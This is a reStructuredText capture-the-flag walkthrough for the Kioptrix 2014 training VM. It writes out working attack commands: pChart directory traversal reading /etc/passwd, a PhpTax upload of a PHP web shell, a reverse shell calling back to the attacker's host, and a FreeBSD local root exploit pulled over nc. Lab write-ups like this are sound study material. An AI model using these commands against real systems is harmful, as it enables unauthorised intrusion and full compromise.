@@ -1,0 +1,298 @@
+.. include:: /pentest_links.txt
+
+.. _Kioptrix5:
+
+****************
+Kioptrix Level 5
+****************
+
+Setup
+=====
+
+Setting up the VMware VM
+------------------------
+
+The challenge is `Kioptrix: 2014 (#5) <https://www.vulnhub.com/entry/kioptrix-2014-5,62/>`_, the fifth of the `Vulnhub Kioptrix Series <https://www.vulnhub.com/series/kioptrix,8/>`_. The VM comes packaged as `kiop2014.tar.bz2 <http://www.kioptrix.com/dlvm/kiop2014.tar.bz2>`_, which is a bz2 archive containing a VMware vmdk file. See :ref:`VMSetup` for background on using the VMware vmdk file. kioptrix5 runs FreeBSD 9.
+
+Setting up your environment
+---------------------------
+
+If you want to easily cut-and-paste from the sample code below, download :download:`kioptrix5_setup.sh`: 
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  mkdir -p $PT
+  cd $PT
+  # download kioptrix5_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/kioptrix5_setup.sh
+  # edit as needed; later the recon will give you TARGET IP
+  source kioptrix5_setup.sh
+
+The source for :file:`kioptrix5_setup.sh` should look something like:
+
+.. literalinclude:: kioptrix5_setup.sh
+   :language: bash
+
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/nmap
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we know $TARGET and can fill it in $PT/kioptrix5_setup.sh and also edit :file:`/etc/hosts` to add "kioptrix5.com" (``echo "$TARGET kioptrix5.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+* port 80, 8080: Apache httpd 2.2.2.1 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+
+  Port 8080 returned 403 Forbidden. The OS is FreeBSD 9.0.
+
+Port 80 reconnaissance via dirb & nikto
+---------------------------------------
+
+Out of habit we do :program:`dirb` and :program:`nikto` scans.
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/spider
+  dirb  http://$HOST/ -o dirb80.txt
+  dirb  http://$HOST:8080/ -o dirb8080.txt
+  nikto -output nikto.html -C all -host $HOST -port 80,8080
+
+:program:`dirb` on port 80 found :file:`index.html` and :file:`cgi-bin` (which might be vulnerable to shellshock); 8080 only revealed the :file:`cgi-bin`. So port 80 seems to have nothing, port 8080 is forbidden.
+
+:program:`nikto` reported "+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756." However, no exploits were found for the CVE.
+
+"403 Forbidden" and the "User-Agent"
+------------------------------------
+
+Actually visiting the web site shows http://kioptrix5.com/ returns "It works!" and http://kioptrix5.com:8080/ returns "403 Forbidden".
+
+But if you check out the source for the "It works!" page you'll find:
+
+.. code-block:: console
+  :emphasize-lines: 1,5
+
+  hacker@kali:~/pentest/kioptrix5$ curl --silent http://kioptrix5.com/
+  <html>
+   <head>
+    <!--
+    <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
+    -->
+   </head>
+
+   <body>
+    <h1>It works!</h1>
+   </body>
+  </html>
+
+`Search the Exploit Database for pChart 2.1.3 <https://www.exploit-db.com/search/?action=search&description=pChart+2.1.3&e_author=>`_ gives `pChart 2.1.3 - Multiple Vulnerabilities <https://www.exploit-db.com/exploits/31173/>`_ allows both XSS and directory traversal. Here we pick up :file:`/etc/passwd`:
+
+.. code-block:: bash
+
+  URL='http://kioptrix5.com/pChart2.1.3/examples/index.php?Action=View&Script=/../..'
+  FILE='/etc/passwd'
+  curl --silent "${URL}${FILE}"
+
+Since the output is encoded for a browser it much easier viewing in your browser vs. :program:`curl`.
+
+What about not having permissions on port 8080? Let's take a look at the Apache server configuration file. Searching the Internet for FreeBSD default configuration locations (`Installing and configuring the Apache 2.2.x web server on FreeBSD <http://www.freebsdmadeeasy.com/tutorials/web-server/configure-apache-web-server-on-freebsd.php>`_) shows the ServerRoot :file:`/usr/local`, the DocumentRoot :file:`/usr/local/www/apache2x/data`, and the main config file is :file:`/usr/local/etc/apache22/httpd.conf`. Look at :file:`httpd.conf` by browsing to http://kioptrix5.com/pChart2.1.3/examples/index.php?Action=View&Script=/../../usr/local/etc/apache22/httpd.conf and you'll find the VirtualHost definition for \*:8080 right at the end:
+
+.. code-block:: apache
+  :emphasize-lines: 8
+
+  <VirtualHost *:8080>
+      DocumentRoot /usr/local/www/apache22/data2
+
+  <Directory "/usr/local/www/apache22/data2">
+      Options Indexes FollowSymLinks
+      AllowOverride All
+      Order allow,deny
+      Allow from env=Mozilla4_browser
+  </Directory>
+
+  </VirtualHost>
+
+"Allow from env=Mozilla4_browser" indicates that only browsers with User-Agent beginning with "Mozilla/4.0" are allowed access. So that appears to be the culprit for "403 Forbidden".
+
+There are alternative ways to figure the agent out. Since the web site is presumably used by somebody, what could be stopping us from accessing login or functionality pages? In general it could be our wordlists don't have the magic words for access; our IPs are in the wrong range (less likely as we're all on the same subnet); or something about our request (HTTP headers, parameters, ...) prevents access. If you used :program:`ZAP` it finds a :file:`phptax` subdirectory on port 8080. So why did :program:`ZAP` find this directory and not our scans? In :program:`ZAP`, :kbd:`right-click` :file:`phptax` then :menuselection:`Save Raw --> Request --> Header` to get:
+
+.. code-block:: http
+
+  GET http://kioptrix5.com:8080/phptax HTTP/1.1
+  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)
+  Pragma: no-cache
+  Cache-Control: no-cache
+  Referer: http://kioptrix5.com:8080/phptax/
+  Host: kioptrix5.com:8080
+
+The most likely impediments to access are "User-Agent" and "Referer". Trying 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)' allows access to the page.
+
+.. code-block:: console
+
+  URL='http://kioptrix5.com:8080/phptax/'
+  AGENT='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)'
+  curl --silent --user-agent "$AGENT" \
+       $URL
+
+So now we can access the phptax pages by using "User-Agent" starting with "Mozilla/4.0". Mozilla has the `User Agent Switcher <https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/>`_ to switch the user agent.
+
+
+The Exploit
+===========
+
+`PHPTAX <http://phptax.sourceforge.net/>`_ vulnerability yields a reverse shell
+-------------------------------------------------------------------------------
+
+`Search the Exploit Database for PHPTAX <https://www.exploit-db.com/search/?action=search&description=PHPTAX&e_author=>`_ reveals several exploits to execute remote code. The one we'll follow is `PhpTax 0.8 - File Manipulation(newvalue,field) Remote Code Execution <https://www.exploit-db.com/exploits/25849/>`_. It allows uploading a file to the :file:`phptax/data/` folder.
+
+We illustrate two different files to upload: the first is a PHP snippet :file:`rce.php`, that executes shell commands: ``<?php passthru($_GET[cmd]);?>``
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/exploit
+  AGENT='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)'
+  PHPTAX='http://kioptrix5.com:8080/phptax'
+  # The shell command executor.
+  SCRIPTNAME='rce.php'
+  SCRIPT='<?php passthru($_GET[cmd]);?>'
+  URL="$PHPTAX/index.php"
+  # Upload the command script.
+  #   field = file name, newvalue = file contents
+  curl --silent --user-agent "$AGENT" \
+       --data-urlencode field="$SCRIPTNAME" \
+       --data-urlencode newvalue="$SCRIPT" \
+       --get $URL
+
+  # Try out a few commands
+  CMD='id'
+  URL_RCE="$PHPTAX"'/data/rce.php'
+  curl --silent --user-agent "$AGENT" \
+       --get --data-urlencode cmd="$CMD" \
+       $URL_RCE
+
+  CMD='uname -a'
+  curl --silent --user-agent "$AGENT" \
+       --get --data-urlencode cmd="$CMD" \
+       $URL_RCE
+
+  CMD='cat /etc/passwd'
+  curl --silent --user-agent "$AGENT" \
+       --get --data-urlencode cmd="$CMD" \
+       $URL_RCE
+
+The second is a PHP reverse shell allowing more convenient reconnaissance via a PHP reverse shell:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/exploit
+  AGENT='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)'
+  PHPTAX='http://kioptrix5.com:8080/phptax'
+
+  # Get the reverse shell.
+  curl --silent --remote-name http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+  tar -xvzf php-reverse-shell-1.0.tar.gz
+  cp php-reverse-shell-1.0/php-reverse-shell.php .
+  # Change to our ip/port
+  sed -i "s/127.0.0.1/$KALI/" php-reverse-shell.php
+  sed -i "s/1234/$PORT/" php-reverse-shell.php
+  # Make sure the reverse shell has a pty.
+  # change 0 => array("pipe", "r")  to  0 => array("pty")
+  sed -i 's/\([012]\) => array("pipe", "[rw]")/\1 => array("pty")/' php-reverse-shell.php
+  REVSH="revsh.php"
+  SCRIPT="$(cat php-reverse-shell.php)"
+  URL="$PHPTAX/index.php"
+  # Upload the PHP reverse shell.
+  curl --silent --user-agent "$AGENT" \
+       --get --data-urlencode "field=$REVSH" --data-urlencode "newvalue=$RSH" \
+         $URL
+
+Exploiting the reverse shell to get root
+----------------------------------------
+
+`Search the Exploit Database for FreeBSD local exploits <https://www.exploit-db.com/search/?action=search&e_author=&platform=8&type=2>`_ yields `FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit <https://www.exploit-db.com/exploits/26368/>`_. Let's fire up the reverse shell and run the exploit. First on  a separate Kali terminal fire up a listener:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/exploit
+  socat - TCP-LISTEN:$PORT
+  
+Going back to your main Kali terminal fire up the reverse PHP shell uploaded previously:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/exploit
+  AGENT='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)'
+  PHPTAX='http://kioptrix5.com:8080/phptax'
+  REVSH="revsh.php"
+  URL_REVSH="$PHPTAX/data/$REVSH"
+  curl --silent --user-agent "$AGENT" \
+        $URL_REVSH
+
+Once the shell opens you can :kbd:`cntl-C` the ``curl`` command and continue on to obtain the exploit code and transfer it to the target host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/kioptrix5
+  source $PT/kioptrix5_setup.sh
+  cd $PT/exploit
+
+  # Download the exploit
+  EXPLOIT='exploit.c'
+  curl --silent --insecure --output $EXPLOIT \
+       https://www.exploit-db.com/download/26368
+  dos2unix $EXPLOIT
+  # Upload to kioptrix5
+  socat FILE:$EXPLOIT TCP-LISTEN:$PORT2
+
+Back in the kioptrix5 reverse shell terminal change the following to have $KALI and $PORT2:
+
+.. code-block:: bash
+
+  # Get a pty
+  /usr/local/bin/python -c 'import pty; pty.spawn("/bin/sh")'
+  # Use nc to transfer exploit source to target
+  # From the kioptrix5 side:
+  cd /tmp
+  # Fill in 
+  nc KALI PORT2 > exploit.c
+  gcc -o exploit exploit.c
+  ./exploit
+  id
+
+And so we have root.
+
